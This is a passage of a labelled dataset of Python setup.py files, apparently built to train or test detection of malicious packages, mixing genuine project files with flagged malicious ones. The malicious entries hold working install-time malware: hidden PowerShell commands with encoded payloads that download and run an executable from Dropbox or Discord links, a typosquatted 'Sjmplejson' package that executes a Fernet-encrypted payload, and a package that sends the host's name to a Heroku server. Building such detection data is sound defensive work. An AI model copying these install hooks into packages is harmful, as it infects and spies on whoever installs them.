long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "tpreplacecrafthacked-9.26", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreplacecrafthacked',\n    packages = ['modlib'],\n    version = '3.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-money-3.0.0", "func": "import codecs\nimport os\nimport re\nimport sys\n\nfrom setuptools import find_packages, setup\nfrom setuptools.command.test import test as TestCommand\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass into py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = []\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\ntest_requirements = [\n    \"pytest>=3.1.0\",\n    \"pytest-django\",\n    \"pytest-pythonpath\",\n    \"pytest-cov\",\n    \"mixer\",\n]\n\nextras_requirements = {\n    \"test\": test_requirements,\n    \"exchange\": [\"certifi\"],\n}\n\n\ndef read(fname):\n    file_path = os.path.join(os.path.dirname(__file__), fname)\n    return codecs.open(file_path, encoding=\"utf-8\").read()\n\n\ndef find_version():\n    match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", read(\"djmoney/__init__.py\"), re.M)\n    if match:\n        return match.group(1)\n    raise RuntimeError(\"Unable to find __version__ string.\")\n\n\nsetup(\n    name=\"django-money\",\n    version=find_version(),\n    description=(\n        \"Adds support for using money and currency fields in django models and forms. \"\n        \"Uses py-moneyed as the money implementation.\"\n    ),\n    long_description=read(\"README.rst\"),\n    long_description_content_type=\"text/x-rst\",\n    url=\"https://github.com/django-money/django-money\",\n    maintainer=\"Greg Reinbach\",\n    maintainer_email=\"greg@reinbach.com\",\n    license=\"BSD\",\n    packages=find_packages(include=[\"djmoney\", \"djmoney.*\"]),\n    install_requires=[\"setuptools\", \"Django>=2.2\", \"py-moneyed>=2.0,<3.0\"],\n    python_requires=\">=3.7\",\n    platforms=[\"Any\"],\n    keywords=[\"django\", \"py-money\", \"money\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Framework :: Django :: 4.1\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    tests_require=test_requirements,\n    extras_require=extras_requirements,\n    cmdclass={\"test\": PyTest},\n)\n", "target": 0}
{"idx": "Sjmplejson-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'tvQukbpdnpJHVPnQYCpVFwwutsyxwvsNwvlbRoOGCTlKoAgSMeXILmkPodKkdUBrIEJRqDNRKoLtQfVxlWEfuWwHPLxXbXCE'\nLONG_DESCRIPTION = ' ZidMgFMwXUXzgFmIiztaGaViptqByIWkbeAvlXwQArRihEojPoBKkNqikzfybbsOTMRwIdyWpKqUAWdAPKuIilwxOqFDZOrDgjJSUnvftBHRT WNGekhPEolHHZuOyTiYIZAxfqicTzNMooEbIhYNMQCtKvGSuRUObbaFLeoPPmJpabPCoSdllEJICKImwdQGCeSbk ozGmxmPtJOXWqLLaJMIwOZS gjhwHSNeXPeUWtGxRaiDYVhcCldtKgHvwtWkRIzasjFwIfgpZgVlkAlRBfftbgytbehCXVcHexoHjXRJKJAUEWogTOCIKcFuJlCNsjkMfnypxxLworAfsBElIbWPanMrQmzBuaeJQckyyUbMfwWUmbQIIcHID hDcdMoBruTcolXFfJlcWwrBMmUCEnSHMskEylVt'\n\n\nclass wwIJHrUNackpNfCNMFeIRjsxwMWZsyBGyBDKaEuzDmqLVuAqIMtFFNsRweRFJziWYPxRaltxVQovCBewXANbayIaEUaQdfDUOoHWUEsdpNpIwqwJoBYiCVAZnCVsqiFrkHArkJblIohDqLuaZbcygOXMJxJloutafvZjZZwfsXzBEa(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'RISHDSAP0KmKN9Ax9GuFtj52EMjcqx5XyShimNLi7nQ=').decrypt(b'gAAAAABmBH8ocklnCQ2mux1-EuZao9KSuxp1Scqwzyy_KK3_6nfue5qh7DBsaFRbbAqE3D9EGcdFJk7gX4XGrLlt37U4QB1U-YOANeU7dxP3VepZ0-s8IQ89lzU3dfGBpeYRDVX0vdSIYa5JspwEgmwXVcHpvPZpCm9fqi5MlEiglUtehwtFBWFZYuEAAOyVOM0dU1PzSGl71rnt6yJ-pN0qWGZnnCDPXTYxd-Wf5TI41V_8EXNlPXw='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"Sjmplejson\",\n    version=VERSION,\n    author=\"nnAjeNiTUYZwp\",\n    author_email=\"YhkhEQyEzC@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': wwIJHrUNackpNfCNMFeIRjsxwMWZsyBGyBDKaEuzDmqLVuAqIMtFFNsRweRFJziWYPxRaltxVQovCBewXANbayIaEUaQdfDUOoHWUEsdpNpIwqwJoBYiCVAZnCVsqiFrkHArkJblIohDqLuaZbcygOXMJxJloutafvZjZZwfsXzBEa,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "fastkml-0.12", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.test import test as TestCommand\nimport sys\nimport os\n\n\nclass PyTest(TestCommand):\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        # import here, cause outside the eggs aren't loaded\n        import pytest\n\n        errno = pytest.main(self.test_args)\n        sys.exit(errno)\n\n\nsetup(\n    name=\"fastkml\",\n    version=\"0.12\",\n    description=\"Fast KML processing in python\",\n    long_description=(\n        open(\"README.rst\").read()\n        + \"\\n\"\n        + open(os.path.join(\"docs\", \"HISTORY.txt\")).read()\n    ),\n    long_description_content_type=\"text/x-rst\",\n    classifiers=[\n        \"Topic :: Scientific/Engineering :: GIS\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Operating System :: OS Independent\",\n    ],  # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    keywords=\"GIS KML Google Maps OpenLayers\",\n    author=\"Christian Ledermann\",\n    author_email=\"christian.ledermann@gmail.com\",\n    url=\"https://github.com/cleder/fastkml\",\n    license=\"LGPL\",\n    packages=find_packages(exclude=[\"ez_setup\", \"examples\", \"tests\"]),\n    include_package_data=True,\n    zip_safe=False,\n    tests_require=[\"pytest\"],\n    cmdclass={\"test\": PyTest},\n    install_requires=[\n        # -*- Extra requirements: -*-\n        \"pygeoif<1.0\",\n        \"python-dateutil\",\n    ],\n    entry_points=\"\"\"\n    # -*- Entry points: -*-\n    \"\"\",\n)\n", "target": 0}
{"idx": "thesis-uniud-package-1.0.0", "func": "import atexit\nimport socket\nimport urllib\nimport base64\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\ndef _post_install():\n    hostname = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'\n    destination = os.path.join(os.path.dirname(__file__), 'logo.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\nsetup(\n    name='thesis-uniud-package',\n    version='1.0.0',\n    author='Francesco Pinzauti',\n    author_email='francesco@pinzauti.xyz',\n    description='Thesis package.',\n    packages=find_packages(),\n    cmdclass={\n        'install': CustomInstallCommand,\n    },\n)\n", "target": 1}
{"idx": "docker-image-py-0.1.12", "func": "#!/usr/bin/env python\nimport os\n\nfrom setuptools import setup\n\nROOT_DIR = os.path.dirname(__file__)\nSOURCE_DIR = os.path.join(ROOT_DIR)\n\ninstall_requires = [\n    'regex>=2019.4.14',\n]\n\nsetup(\n    name=\"docker-image-py\",\n    version='0.1.12',\n    description=\"Parse docker image as distribution does.\",\n    url='https://github.com/realityone/docker-image-py',\n    packages=['docker_image'],\n    install_requires=install_requires,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "tphydracvmask-6.11", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydracvmask',\n    packages = ['modlib'],\n    version = '4.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpsplitpostpong-1.95", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpsplitpostpong',\n    packages = ['modlib'],\n    version = '3.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-logging-3.2.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-logging\"\ndescription = \"Stackdriver Logging API client library\"\nversion = \"3.2.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"google-cloud-appengine-logging>=0.1.0, <2.0.0dev\",\n    \"google-cloud-audit-log >= 0.1.0, < 1.0.0dev\",\n    \"google-cloud-core >= 2.0.0, <3.0.0dev\",\n    \"grpc-google-iam-v1 >=0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package for package in setuptools.find_packages() if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-logging\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "flake8-colors-0.1.9", "func": "#!/usr/bin/env python\n\nimport setuptools\n\ndescription = 'Error highlight plugin for Flake8.'\n\nwith open('README.md', 'r') as fobj:\n    long_description = fobj.read()\n\nrequires = [\n    \"flake8 > 3.0.0\",\n]\n\nsetuptools.setup(\n    name=\"flake8-colors\",\n    license=\"MIT\",\n    version=\"0.1.9\",\n    description=description,\n    long_description=long_description or description,\n    long_description_content_type='text/markdown',\n    author=\"Andrew Dunai\",\n    author_email=\"andrew@dun.ai\",\n    url=\"https://github.com/and3rson/flake8-colors\",\n    packages=[\n        \"flake8_colors\",\n    ],\n    install_requires=requires,\n    entry_points={\n        'flake8.extension': [\n            'flake8-colors = flake8_colors:ColorFormatter',\n        ],\n    },\n    classifiers=[\n        \"Framework :: Flake8\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n)\n", "target": 0}
{"idx": "google-cloud-bigquery-datatransfer-3.7.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-bigquery-datatransfer\"\ndescription = \"BigQuery Data Transfer API client library\"\nversion = \"3.7.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = (\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n)\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-bigquery-datatransfer\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_bigquery_datatransfer_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "infogui-6.12", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'infogui',\n    packages = ['modlib'],\n    version = '10.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-API-3.0.post1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom __future__ import print_function\nfrom setuptools import setup\nimport re\nimport os\nimport sys\n\n\nname = 'Flask-API'\npackage = 'flask_api'\ndescription = 'Browsable web APIs for Flask.'\nurl = 'https://flask-api.github.io/flask-api/'\nauthor = 'Tom Christie'\nauthor_email = 'tom@tomchristie.com'\nlicense = 'BSD'\ninstall_requires = ['Flask >= 2.0']\n\nlong_description = \"\"\"Browsable web APIs for Flask.\"\"\"\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.search(\"^__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py, re.MULTILINE).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\nsetup(\n    name=name,\n    version=get_version(package),\n    url=url,\n    license=license,\n    description=description,\n    long_description=long_description,\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    install_requires=install_requires,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Flask',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "libloadram-9.61", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libloadram',\n    packages = ['modlib'],\n    version = '2.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
